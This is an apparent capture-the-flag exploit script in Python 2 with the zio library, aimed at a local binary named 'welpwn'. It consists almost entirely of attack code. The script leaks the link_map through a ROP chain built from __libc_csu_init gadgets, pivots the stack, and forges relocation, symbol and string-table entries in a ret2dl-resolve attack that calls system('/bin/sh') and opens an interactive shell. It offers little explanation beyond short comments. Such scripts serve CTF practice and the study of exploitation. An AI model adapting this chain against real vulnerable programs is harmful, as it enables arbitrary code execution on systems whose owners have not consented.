from zio import *
target  = './welpwn_932a4428ea8d4581431502ab7e66ea4b'
io      = zio(target, print_read = COLORED(RAW, 'blue'), print_write = COLORED(RAW, 'green'), timeout = 10000)
io.gdb_hint([0x00000000004007cc])

plt_resolve = 0x0000000000400590
got_read    = 0x0000000000601038
got_write   = 0x0000000000601020
got_linkmap = 0x0000000000601008

leave_ret   = 0x00000000004007cb
pop_rbp_ret = 0x0000000000400675
pop_rdi_ret = 0x00000000004008a3
p4_ret      = 0x000000000040089c

adr_stage   = 0x0000000000601000 + 0x800

adr_rel_plt         = 0x0000000000400498
adr_dyn_sym         = 0x00000000004002c0
adr_dyn_str         = 0x00000000004003c8
adr_fake_rel_plt    = adr_stage + 0x100
adr_fake_dyn_sym    = adr_stage + 0x208
adr_fake_dyn_str    = adr_stage + 0x300
adr_shell           = adr_stage + 0x400

com_part1           = 0x40089a
com_part2           = 0x400880

adr_entry           = 0x400630

def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
    payload  = l64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
    payload += l64(0x0)     # rbx be 0x0
    payload += l64(0x1)     # rbp be 0x1
    payload += l64(jmp2)    # r12 jump to
    payload += l64(arg3)    # r13 -> rdx    arg3
    payload += l64(arg2)    # r14 -> rsi    arg2
    payload += l64(arg1)    # r15 -> edi    arg1
    payload += l64(part2)   # part2 entry will call [rbx + r12 + 0x8]
    payload += 'A' * 56     # junk
    return payload

# leak link_map
payload0  = 'A' * 24
payload0 += l64(p4_ret)
payload0 += com_gadget(com_part1, com_part2, got_write,
        arg1 = 0x1,
        arg2 = got_linkmap,
        arg3 = 0x8)
payload0 += l64(adr_entry)

io.rl()
io.wl(payload0)
adr_linkmap = l64(io.r(8))
print '[+] leak link_map\t:\t' + hex(adr_linkmap)

# overwrite link_map+0x1c8 0x0, read fake structure
payload0  = 'A' * 24
payload0 += l64(p4_ret)
payload0 += com_gadget(com_part1, com_part2, got_read,
        arg1 = 0x0,
        arg2 = adr_linkmap + 0x1c8,
        arg3 = 0x8)
payload0 += com_gadget(com_part1, com_part2, got_read,
        arg1 = 0x0,
        arg2 = adr_stage,
        arg3 = 0x500)
payload0 += l64(pop_rbp_ret)
payload0 += l64(adr_stage)
payload0 += l64(leave_ret)

io.rl()
io.wl(payload0)
io.w(l64(0x0))

# fake structure
align_rel_plt   = 0x8*3 - (adr_fake_rel_plt - adr_rel_plt) % (0x8 * 3)
payload1  = 'A' * 0x8
payload1 += l64(pop_rdi_ret) # set $rdi "/bin/sh"
payload1 += l64(adr_shell)
payload1 += l64(plt_resolve)
payload1 += l64((adr_fake_rel_plt - adr_rel_plt + align_rel_plt) / (0x8 * 3))
payload1 += l64(0xdeadbeef)
payload1  = payload1.ljust(0x100, 'A')

align_dyn_sym   = 0x8*3 - (adr_fake_dyn_sym - adr_dyn_sym) % (0x8 * 3)
payload1 += 'A' * align_rel_plt
payload1 += l64(got_read)
payload1 += l64((adr_fake_dyn_sym - adr_dyn_sym + align_dyn_sym)/(0x8*3)*0x100000000 + 0x7)
payload1  = payload1.ljust(0x208, 'A')

payload1 += 'A' * align_dyn_sym
payload1 += l32(adr_fake_dyn_str - adr_dyn_str)
payload1 += l32(0x12)
payload1 += l64(0x0)
payload1 += l64(0x0)
payload1  = payload1.ljust(0x300, 'A')

payload1 += 'system\x00'
payload1  = payload1.ljust(0x400, 'A')

payload1 += '/bin/sh\x00'

io.wl(payload1)
io.interact()
